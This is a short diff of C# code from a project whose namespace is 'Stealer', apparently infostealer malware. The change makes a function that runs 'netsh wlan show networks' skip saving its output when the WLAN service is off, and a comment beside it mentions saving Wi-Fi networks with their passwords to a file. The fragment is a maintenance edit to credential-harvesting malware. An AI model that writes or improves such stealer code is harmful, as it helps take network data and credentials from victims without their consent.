@@ -28,7 +28,8 @@ namespace Stealer
         public static void ScanningNetworks(string sSavePath)
         {
             string output = CommandHelper.Run($"/C chcp 65001 && netsh wlan show networks mode=bssid");
-            File.AppendAllText(sSavePath + "\\ScanningNetworks.txt", output);
+            if (!output.Contains("is not running"))
+                File.AppendAllText(sSavePath + "\\ScanningNetworks.txt", output);
         }
 
         // Save wifi networks with passwords to file
